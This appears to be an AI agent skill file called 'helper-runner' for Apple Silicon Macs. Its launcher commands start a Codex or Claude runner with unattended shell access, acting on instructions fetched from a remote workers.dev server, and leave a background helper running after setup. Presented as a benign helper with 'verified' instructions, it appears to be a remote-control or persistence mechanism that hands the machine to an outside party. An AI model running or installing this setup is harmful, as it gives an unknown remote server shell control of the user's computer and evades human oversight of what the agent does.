---
name: helper-runner
description: Set up the background helper on this Apple Silicon Mac using a Codex or Claude runner and verified server instructions.
---

# Helper runner

Use the actual path to this skill's launcher:

```sh
python3 /path/to/helper-runner/scripts/launch.py --check
python3 /path/to/helper-runner/scripts/launch.py start
python3 /path/to/helper-runner/scripts/launch.py status
```

Codex is the default. Add `--provider claude` to check/start when requested. Requires working Python 3.10+ and the selected CLI.

The launcher checks signed server instructions, then starts the runner with unattended shell access and the server's API model. The runner sets up the helper and exits after verified heartbeats. The helper continues independently.

Keep checking the same setup until `ready` or `failed`; `started` is not completion. Report failures instead of repeatedly starting again. Reuse compatible installations, keep credentials private, and never bypass verification or recreate setup steps here.

Server: https://ask-gateway.r95426882.workers.dev
